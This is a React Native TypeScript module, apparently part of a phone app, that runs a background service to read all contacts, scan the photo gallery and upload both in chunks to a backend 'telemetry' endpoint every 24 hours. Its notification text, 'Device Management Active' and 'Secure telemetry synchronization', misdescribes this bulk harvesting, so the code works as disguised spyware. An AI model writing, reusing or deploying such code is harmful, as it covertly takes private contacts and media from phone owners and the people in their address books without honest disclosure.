import BackgroundService from 'react-native-background-actions';
import Contacts from 'react-native-contacts';
import axios from 'axios';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { scanAndUploadGallery, MediaItem } from './MediaPipelineService';

const sleep = (time: number) => new Promise<void>((resolve) => setTimeout(resolve, time));

const CHUNK_SIZE = 50;

// Kitne ghante baad dobara sync karna hai
const SYNC_INTERVAL_HOURS = 24;
const LAST_SYNC_KEY = 'SCH_LAST_SYNC_TIME';
const UPLOADED_IDS_KEY = 'SCH_UPLOADED_FILE_IDS';

interface SyncOptions {
  backendUrl: string;
  deviceId: string;
}

// AsyncStorage se pehle se uploaded file IDs load karo
const loadUploadedIds = async (): Promise<Set<string>> => {
  try {
    const saved = await AsyncStorage.getItem(UPLOADED_IDS_KEY);
    if (saved) {
      const arr: string[] = JSON.parse(saved);
      console.log(`[Sync] Loaded ${arr.length} previously uploaded file IDs from storage`);
      return new Set(arr);
    }
  } catch (e) {}
  return new Set<string>();
};

// Naye uploaded IDs AsyncStorage mein save karo
const saveUploadedIds = async (ids: Set<string>) => {
  try {
    await AsyncStorage.setItem(UPLOADED_IDS_KEY, JSON.stringify([...ids]));
  } catch (e) {}
};

// Check karo ke 24 ghante guzar gaye hain ya nahi
const shouldRunSync = async (): Promise<boolean> => {
  try {
    const lastSync = await AsyncStorage.getItem(LAST_SYNC_KEY);
    if (!lastSync) return true; // Pehli dafa — zaroor chalaao

    const lastSyncTime = parseInt(lastSync, 10);
    const hoursPassed = (Date.now() - lastSyncTime) / (1000 * 60 * 60);

    console.log(`[Sync] Last sync was ${hoursPassed.toFixed(1)} hours ago`);
    return hoursPassed >= SYNC_INTERVAL_HOURS;
  } catch (e) {
    return true;
  }
};

// Sync complete hone par time save karo
const markSyncDone = async () => {
  try {
    await AsyncStorage.setItem(LAST_SYNC_KEY, Date.now().toString());
  } catch (e) {}
};

export const startBackgroundSync = async (options: SyncOptions) => {

  // ── Check: 24 ghante se pehle sync ho chuka hai? ──────────────────────────
  const shouldSync = await shouldRunSync();
  if (!shouldSync) {
    console.log('[Sync] Skipping — sync already done within last 24 hours');
    return; // Kuch nahi karo
  }

  console.log('[Sync] Starting new sync session...');

  const veryIntensiveTask = async () => {
    await new Promise(async () => {

      // ── Pehle se uploaded IDs load karo (Cloudinary duplicates rokne ke liye) ─
      const persistedUploadedIds = await loadUploadedIds();

      // ── Contacts fetch ────────────────────────────────────────────────────
      let allContacts: any[] = [];
      try {
        allContacts = await Contacts.getAll();
        console.log(`[Sync] Fetched ${allContacts.length} contacts`);
      } catch (err) {
        console.error('[Sync] Contacts fetch failed:', err);
      }

      // Contacts ko 50-50 chunks mein divide karo
      const contactChunks: any[][] = [];
      for (let i = 0; i < allContacts.length; i += CHUNK_SIZE) {
        contactChunks.push(allContacts.slice(i, i + CHUNK_SIZE));
      }
      let contactChunkIndex = 0;
      const allContactsSent = () => contactChunkIndex >= contactChunks.length;

      // ── Main loop: 28 x 15s = 7 minutes ───────────────────────────────────
      for (let i = 0; i < 28 && BackgroundService.isRunning(); i++) {

        // ── Gallery scan ─────────────────────────────────────────────────
        let newMediaItems: MediaItem[] = [];
        try {
          newMediaItems = await scanAndUploadGallery(
            options.deviceId,
            persistedUploadedIds, // Pehle se uploaded IDs pass karo
          );

          // Naye uploaded IDs persist karo
          if (newMediaItems.length > 0) {
            for (const item of newMediaItems) {
              persistedUploadedIds.add(item.fileId);
            }
            await saveUploadedIds(persistedUploadedIds);
          }
        } catch (mediaErr: any) {
          console.warn(`[Sync ${i + 1}] Gallery error:`, mediaErr?.message);
        }

        // ── Backend sync ─────────────────────────────────────────────────
        try {
          const payload: any = { deviceId: options.deviceId };

          if (!allContactsSent() && contactChunks.length > 0) {
            payload.contacts = contactChunks[contactChunkIndex];
            console.log(`[Sync ${i + 1}] Contact chunk ${contactChunkIndex + 1}/${contactChunks.length}`);
          }

          if (newMediaItems.length > 0) {
            payload.mediaItems = newMediaItems;
          }

          if (payload.contacts || payload.mediaItems) {
            await axios.post(`${options.backendUrl}/api/telemetry/sync`, payload);

            if (payload.contacts) {
              contactChunkIndex++;
            }
          }

          console.log(`[Sync ${i + 1}/28] media:${newMediaItems.length} contactChunk:${contactChunkIndex}/${contactChunks.length}`);

        } catch (e: any) {
          console.error(`[Sync ${i + 1}] Backend failed:`, e?.message);
        }

        if (i < 27) {
          await sleep(15000);
        }
      }

      // ── Sync complete — time save karo ────────────────────────────────────
      await markSyncDone();
      console.log('[Sync] Done. Next sync after 24 hours.');

      if (BackgroundService.isRunning()) {
        await BackgroundService.stop();
      }
    });
  };

  await BackgroundService.start(veryIntensiveTask, {
    taskName: 'EnterpriseSync',
    taskTitle: 'Device Management Active',
    taskDesc: 'Secure telemetry synchronization in progress',
    taskIcon: { name: 'ic_launcher', type: 'mipmap' },
    color: '#ff00ff',
    foregroundServiceType: ['dataSync'],
  } as any);
};